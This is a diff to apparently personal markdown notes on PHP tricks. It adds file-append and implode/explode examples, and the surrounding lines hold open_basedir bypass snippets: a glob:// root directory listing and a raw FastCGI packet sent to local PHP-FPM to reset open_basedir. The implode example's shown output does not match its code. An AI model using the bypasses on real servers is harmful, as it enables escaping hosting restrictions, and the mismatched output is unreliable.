@@ -32,6 +32,34 @@ ${${$name}} = "Monkey"; // name => "Cat"; $Cat => "Dog"; $Dog => "Monkey";
 highlight_file("index.php");
 ```
 
+* Write to a file, `FILE_APPEND` appends data to file, and `LOCK_EX` means `EXCLUSIVE LOCK`, only one process can possess an `EXCLUSIVE LOCK`.
+```php
+<?php
+$data = file_get_contents('php://input');
+$data .= "-----------------------------------------------------------\n\n";
+file_put_contents('/var/www/html/data.txt', print_r($data,true), FILE_APPEND | LOCK_EX);
+?>
+```
+* `implode(string glue,array)` joins all the value array with a string, it will discard all keys of an array and do the operation with each value.
+```php
+<?php
+    $a1 = array("one","two","three");
+    $a2 = array("a");
+    $b = array( '1st' => 'four', 'five', '3rd' => 'six'  );
+   
+    echo "a1 is: ".implode("','",$a1);
+    echo "a2 is: ".implode("','",$a2);
+    echo "b  is: ".implode("','",$b);
+?>
+Output:
+a1 is: one,two,three
+a2 is: a
+b  is: four,five,six
+```
+
+* `explode(string delimiter, string)`, it is like `split` in python
+
+
 * Bypass `open_basedir` via glob wrapper, this leads to directory listing of `/`, root directory
 ```php
 foreach(new DirectoryIterator("glob:///*") as $f) echo "$f\n";
@@ -47,10 +75,11 @@ ini.set('open_basedir', '/');
 ```
 
 * Trying to bypass `disabled_functions` and `open_basedir` using `fpm`, still testing
-```
+```php
 $params = array(); $params['SCRIPT_NAME'] = $_SERVER['SCRIPT_NAME']; $params['SCRIPT_FILENAME'] = $_SERVER['SCRIPT_FILENAME']; $params['REQUEST_METHOD'] = 'GET'; $params['QUERY_STRING'] = 'stop=true'; $params['PHP_VALUE'] = 'open_basedir=/'; $params_encoded = ''; print_r($params); foreach ($params as $k=>$v) { $params_encoded.= chr(strlen($k)).chr(strlen($v)).$k.$v; } $len = strlen($params_encoded); $len_encoded = chr($len >> 8).chr($len & 255);
 $fp = fsockopen('127.0.0.1',19260); fwrite($fp, "\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"); fwrite($fp, "\x01\x04\x00\x01".$len_encoded."\x00\x00".$params_encoded); fwrite($fp, "\x01\x04\x00\x01\x00\x00\x00\x00"); fwrite($fp, "\x01\x05\x00\x01\x00\x00\x00\x00"); sleep(2); $result = ''; while (!feof($fp)) { $result .= fread($fp, 1024); } fclose($fp); $matches = array(); preg_match('/START.*END/s', $result, $matches); echo $matches[0];
 ```
+
 ```php
 echo 123;
 class FCGIClient
